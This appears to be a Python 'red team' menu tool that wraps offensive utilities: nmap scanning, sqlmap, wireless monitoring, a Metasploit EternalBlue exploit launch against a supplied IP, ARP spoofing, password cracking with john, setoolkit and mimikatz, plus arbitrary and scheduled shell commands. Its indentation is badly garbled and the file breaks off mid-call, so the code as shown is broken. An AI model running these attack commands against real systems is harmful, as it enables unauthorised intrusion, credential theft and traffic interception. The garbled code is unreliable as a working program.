import subprocess
import os
import sys
import time
import logging
import concurrent.futures
import re
import json
import hashlib
import threading
import random
import shutil
from datetime import datetime
import yaml
import threading

# Set up logging
logging.basicConfig(filename="red_team_tool.log", level=logging.INFO, 
                    format="%(asctime)s - %(levelname)s - %(message)s")

                    # Helper function to run shell commands with error handling, retries, and logging
                    def run_command(cmd, retries=3):
                        try:
                                logging.info(f"Executing: {cmd}")
                                        result = subprocess.check_output(cmd, shell=True, text=True)
                                                print(f"[+] Command Output:\n{result}")
                                                        return result
                                                            except subprocess.CalledProcessError as e:
                                                                    logging.error(f"Command Error: {e}")
                                                                            print(f"[-] Command Error: {e}")
                                                                                    if retries > 0:
                                                                                                print(f"Retrying... {retries} attempts left")
                                                                                                            return run_command(cmd, retries - 1)
                                                                                                                    return None

                                                                                                                    # Check for root privileges
                                                                                                                    def check_root():
                                                                                                                        if os.geteuid() != 0:
                                                                                                                                print("[-] This script requires root privileges. Please run as root.")
                                                                                                                                        sys.exit(1)

                                                                                                                                        # Dependency check
                                                                                                                                        def check_dependencies():
                                                                                                                                            tools = ["nmap", "john", "airmon-ng", "airodump-ng", "nikto", "sqlmap", "foremost", "setoolkit", "ghidra", "msfconsole", "arpspoof"]
                                                                                                                                                missing = []
                                                                                                                                                    for tool in tools:
                                                                                                                                                            if subprocess.call(f"command -v {tool}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                                                                                                                                                                        missing.append(tool)
                                                                                                                                                                            if missing:
                                                                                                                                                                                    print(f"[-] Missing tools: {', '.join(missing)}. Please install them before proceeding.")
                                                                                                                                                                                            sys.exit(1)

                                                                                                                                                                                            # Input validation: sanitize user inputs to prevent injection or invalid data
                                                                                                                                                                                            def sanitize_input(user_input):
                                                                                                                                                                                                sanitized_input = re.sub(r'[^a-zA-Z0-9\.\-_:\/]', '', user_input)
                                                                                                                                                                                                    return sanitized_input

                                                                                                                                                                                                    # Report generation with enhanced formats (JSON, HTML, or PDF)
                                                                                                                                                                                                    def generate_report(details, output_format="txt"):
                                                                                                                                                                                                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                                                                                                                                                                                            report_filename = f"report_{timestamp}.{output_format}"
                                                                                                                                                                                                                
                                                                                                                                                                                                                    if output_format == "txt":
                                                                                                                                                                                                                            with open(report_filename, "w") as report:
                                                                                                                                                                                                                                        report.write("Red Team Report\n")
                                                                                                                                                                                                                                                    report.write(f"Timestamp: {timestamp}\n")
                                                                                                                                                                                                                                                                report.write(f"Details:\n{details}\n")
                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                        elif output_format == "json":
                                                                                                                                                                                                                                                                                with open(report_filename, "w") as report:
                                                                                                                                                                                                                                                                                            json.dump({"timestamp": timestamp, "details": details}, report)
                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                    elif output_format == "html":
                                                                                                                                                                                                                                                                                                            with open(report_filename, "w") as report:
                                                                                                                                                                                                                                                                                                                        report.write(f"<html><body><h1>Red Team Report</h1><p>Timestamp: {timestamp}</p><pre>{details}</pre></body></html>")
                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                print(f"[+] Report Generated: {report_filename}")

                                                                                                                                                                                                                                                                                                                                # Example advanced features
                                                                                                                                                                                                                                                                                                                                def run_forensics(disk_image, output_folder):
                                                                                                                                                                                                                                                                                                                                    print("[*] Running Forensics Tools Module")
                                                                                                                                                                                                                                                                                                                                        run_command(f"foremost -i {disk_image} -o {output_folder}")

                                                                                                                                                                                                                                                                                                                                        def run_reverse_engineering():
                                                                                                                                                                                                                                                                                                                                            print("[*] Running Reverse Engineering Module")
                                                                                                                                                                                                                                                                                                                                                run_command("ghidra")

                                                                                                                                                                                                                                                                                                                                                def run_web_assessment(target_url):
                                                                                                                                                                                                                                                                                                                                                    print("[*] Running Web Application Assessment")
                                                                                                                                                                                                                                                                                                                                                        run_command(f"nikto -h {target_url}")
                                                                                                                                                                                                                                                                                                                                                            run_command(f"sqlmap -u '{target_url}' --batch")

                                                                                                                                                                                                                                                                                                                                                            def run_wired_attack(interface):
                                                                                                                                                                                                                                                                                                                                                                print("[*] Running Wireless Attacks Module")
                                                                                                                                                                                                                                                                                                                                                                    run_command(f"airmon-ng start {interface}")
                                                                                                                                                                                                                                                                                                                                                                        run_command(f"airodump-ng {interface}mon")

                                                                                                                                                                                                                                                                                                                                                                        def schedule_task(command, interval=60):
                                                                                                                                                                                                                                                                                                                                                                            """ Schedule a task at intervals (in seconds). """
                                                                                                                                                                                                                                                                                                                                                                                print(f"[*] Scheduling task to run every {interval} seconds.")
                                                                                                                                                                                                                                                                                                                                                                                    threading.Timer(interval, schedule_task, [command, interval]).start()
                                                                                                                                                                                                                                                                                                                                                                                        run_command(command)

                                                                                                                                                                                                                                                                                                                                                                                        # Allowing the user to choose multiple options
                                                                                                                                                                                                                                                                                                                                                                                        def select_modules():
                                                                                                                                                                                                                                                                                                                                                                                            print("""
                                                                                                                                                                                                                                                                                                                                                                                                [1] Information Gathering
                                                                                                                                                                                                                                                                                                                                                                                                    [2] Vulnerability Analysis
                                                                                                                                                                                                                                                                                                                                                                                                        [3] Exploitation Tools
                                                                                                                                                                                                                                                                                                                                                                                                            [4] Wireless Attacks
                                                                                                                                                                                                                                                                                                                                                                                                                [5] Web Application Assessment
                                                                                                                                                                                                                                                                                                                                                                                                                    [6] Forensics Tools
                                                                                                                                                                                                                                                                                                                                                                                                                        [7] Social Engineering Tools
                                                                                                                                                                                                                                                                                                                                                                                                                            [8] Reporting Tools
                                                                                                                                                                                                                                                                                                                                                                                                                                [9] Reverse Engineering
                                                                                                                                                                                                                                                                                                                                                                                                                                    [10] Password Attacks
                                                                                                                                                                                                                                                                                                                                                                                                                                        [11] Sniffing & Spoofing
                                                                                                                                                                                                                                                                                                                                                                                                                                            [12] Post-Exploitation
                                                                                                                                                                                                                                                                                                                                                                                                                                                [13] Miscellaneous
                                                                                                                                                                                                                                                                                                                                                                                                                                                    [14] Schedule Task
                                                                                                                                                                                                                                                                                                                                                                                                                                                        [15] Exit
                                                                                                                                                                                                                                                                                                                                                                                                                                                            """)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                choice = input("Select an option: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    return int(choice) if choice.isdigit() else 15

                                                                                                                                                                                                                                                                                                                                                                                                                                                                    def main():
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        check_root()
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            check_dependencies()

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                while True:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        choice = select_modules()
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if choice == 1:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    target = input("Enter target domain/IP: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                target = sanitize_input(target)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            run_command(f"whois {target}")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        run_command(f"nslookup {target}")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    run_command(f"ping -c 4 {target}")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    elif choice == 2:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                target = input("Enter target domain/IP: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            target = sanitize_input(target)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        run_command(f"nmap -sV -A -T4 {target}")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        elif choice == 3:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    target_ip = input("Enter target IP: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                target_ip = sanitize_input(target_ip)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            run_command(f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; run'")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            elif choice == 4:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        interface = input("Enter wireless interface (e.g., wlan0): ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    interface = sanitize_input(interface)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                run_wired_attack(interface)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                elif choice == 5:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            target_url = input("Enter target URL: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        target_url = sanitize_input(target_url)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    run_web_assessment(target_url)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    elif choice == 6:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                disk_image = input("Enter path to disk image: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            disk_image = sanitize_input(disk_image)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        output_folder = input("Enter output folder: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    output_folder = sanitize_input(output_folder)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                run_forensics(disk_image, output_folder)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                elif choice == 7:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            run_command("setoolkit")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            elif choice == 8:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        details = input("Enter details for the report: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    output_format = input("Enter report format (txt/json/html): ").strip()
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                generate_report(details, output_format)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                elif choice == 9:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            run_reverse_engineering()
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            elif choice == 10:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        hash_file = input("Enter path to hash file: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    wordlist = input("Enter path to wordlist: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                run_command(f"john --wordlist={wordlist} {hash_file}")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                elif choice == 11:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            interface = input("Enter network interface: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        target_ip = input("Enter target IP: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    gateway_ip = input("Enter gateway IP: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                run_command(f"arpspoof -i {interface} -t {target_ip} {gateway_ip}")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                elif choice == 12:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            run_command("mimikatz")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            elif choice == 13:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        command = input("Enter command: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    run_command(command)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    elif choice == 14:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                command = input("Enter command to schedule: ")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            interval = int(input("Enter interval (seconds): "))
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        schedule_task(command, interval)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        elif choice == 15:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    print("[*] Exiting...")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                sys.exit(0)

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if __name__ == "__main__":
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    main(
